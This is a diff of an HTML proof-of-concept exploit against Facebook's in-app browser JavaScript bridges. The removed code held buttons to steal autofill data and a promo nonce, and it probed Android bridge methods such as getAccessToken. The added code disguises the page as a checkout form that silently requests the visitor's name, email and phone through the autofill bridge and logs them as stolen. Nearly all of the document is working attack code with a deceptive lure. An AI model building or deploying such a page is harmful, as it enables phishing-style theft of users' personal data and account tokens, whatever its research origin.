@@ -4,28 +4,26 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>Meta Bridge Exploitation PoC</title>
     <style>
-        body { font-family: sans-serif; padding: 10px; background: #f4f4f4; }
-        button { padding: 15px; font-size: 16px; background: #d93025; color: white; border: none; border-radius: 5px; width: 100%; margin-bottom: 10px; font-weight: bold; }
-        #log { background: #111; color: #0f0; padding: 10px; font-family: monospace; height: 300px; overflow-y: scroll; word-wrap: break-word; border-radius: 5px; }
-        input { width: 90%; padding: 10px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 4px;}
+        body { font-family: sans-serif; padding: 20px; background: #f4f4f4; }
+        input { width: 100%; padding: 15px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; font-size: 16px; }
+        button { padding: 15px; font-size: 16px; background: #1877f2; color: white; border: none; border-radius: 5px; width: 100%; margin-bottom: 10px; font-weight: bold; }
+        #log { background: #111; color: #0f0; padding: 10px; font-family: monospace; height: 200px; overflow-y: scroll; word-wrap: break-word; border-radius: 5px; margin-top: 20px; }
     </style>
 </head>
 <body>
-    <h2>Weaponized Exploit</h2>
+    <h2>Checkout / Shipping</h2>
+    <p>Please enter your details below:</p>
     
-    <!-- Fake form to trick Facebook's Autofill heuristics -->
-    <form id="fakeForm">
+    <!-- We need a real form so Facebook's heuristic detector sees it -->
+    <form id="checkoutForm">
         <input type="text" id="name" name="name" autocomplete="name" placeholder="Full Name">
         <input type="email" id="email" name="email" autocomplete="email" placeholder="Email Address">
         <input type="tel" id="phone" name="phone" autocomplete="tel" placeholder="Phone Number">
     </form>
 
-    <button onclick="attackAutofill()">1. Steal Autofill Data</button>
-    <button onclick="attackPromo()">2. Steal Promo Nonce</button>
-    <button onclick="attackAndroid()">3. Blind Android API Attack</button>
+    <button onclick="triggerExploit()">Complete Checkout (Trigger Exploit)</button>
     
-    <h3>Execution Log:</h3>
-    <div id="log">Waiting for action...<br></div>
+    <div id="log">Awaiting execution...<br></div>
 
     <script>
         function log(msg) {
@@ -34,60 +32,39 @@
 
         window.attackerCallback = function(data) {
             log("<span style='color:red;'><b>🚨 DATA STOLEN:</b></span><br>" + JSON.stringify(data));
-            alert("Data extracted successfully!");
+            // Autofill response usually populates the form too
+            if (data && data.data) {
+                document.getElementById('name').value = data.data.name || "";
+                document.getElementById('email').value = data.data.email || "";
+                document.getElementById('phone').value = data.data.phone || "";
+            }
         };
 
-        function attackAutofill() {
-            if (!window._AutofillExtensions) { log("Error: _AutofillExtensions not found."); return; }
+        function triggerExploit() {
+            if (!window._AutofillExtensions) {
+                log("Error: _AutofillExtensions not found.");
+                return;
+            }
+            
             try {
-                let initPayload = JSON.stringify({"callbackID": "attackerCallback", "name": "attackerCallback"});
+                let initPayload = JSON.stringify({
+                    "callbackID": "attackerCallback",
+                    "name": "attackerCallback"
+                });
                 window._AutofillExtensions.initializeCallbackHandler(initPayload);
                 
                 let requestPayload = JSON.stringify({
                     "callbackID": "attackerCallback",
                     "name": "attackerCallback",
                     "request_id": "1337",
-                    "autofillFields": "NAME,EMAIL,PHONE", 
                     "requested_fields": ["NAME", "EMAIL", "PHONE"]
                 });
                 window._AutofillExtensions.requestAutoFill(requestPayload);
-                log("requestAutoFill executed! Check for prompt.");
-            } catch (e) { log("Execution Failed: " + e.message); }
-        }
-
-        function attackPromo() {
-            if (!window._PromoExtensions) { log("Error: _PromoExtensions not found."); return; }
-            try {
-                // Since we know they like JSON, let's pass a JSON string
-                let payload = JSON.stringify({"callbackID": "attackerCallback"});
-                let nonce = window._PromoExtensions.getPromoExtensionNonce(payload);
-                log("<span style='color:red;'><b>🚨 NONCE STOLEN:</b></span> " + nonce);
+                log("Exploit executed! Look for the Facebook popup.");
+                
             } catch (e) {
-                log("Promo Failed: " + e.message);
+                log("Execution Failed: " + e.message);
             }
-        }
-
-        function attackAndroid() {
-            let payload = JSON.stringify({
-                "app_id": "121876164619130", // The BizApp ID you found earlier
-                "scope": "public_profile,email,pages_manage_posts"
-            });
-            
-            const targets = [
-                { obj: window.android, method: 'getAccessToken', args: [payload] },
-                { obj: window.android, method: 'getUserInfo', args: [payload] },
-                { obj: window.android, method: 'getToken', args: [] },
-                { obj: window.android, method: 'getCurrentUser', args: [] }
-            ];
-        
-            targets.forEach(t => {
-                try {
-                    let res = t.obj[t.method](...t.args);
-                    log("<b>SUCCESS:</b> " + t.method + " returned: " + JSON.stringify(res));
-                } catch(e) {
-                    log("Method " + t.method + " failed: " + e.message);
-                }
-            });
         }
     </script>
 </body>
